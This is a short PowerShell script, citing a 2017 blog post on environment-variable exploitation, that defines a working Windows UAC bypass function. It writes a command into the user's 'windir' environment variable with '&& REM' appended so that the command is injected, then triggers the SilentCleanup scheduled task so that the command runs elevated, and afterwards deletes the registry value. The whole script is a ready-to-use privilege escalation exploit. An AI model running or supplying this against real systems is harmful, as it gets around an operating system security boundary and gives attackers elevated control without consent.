# https://tyranidslair.blogspot.co.uk/2017/05/exploiting-environment-variables-in.html

Function Invoke-UACBypass {
param($cmd="cmd /K reg delete hkcu\Environment /v windir /f")

    Set-ItemProperty -Path HKCU:\Environment -Name windir -Value "$cmd && REM" -Force
    Invoke-Expression "schtasks /Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I"
    Start-Sleep -Seconds 10
    Remove-ItemProperty -Path HKCU:\Environment -Name windir -Force

}
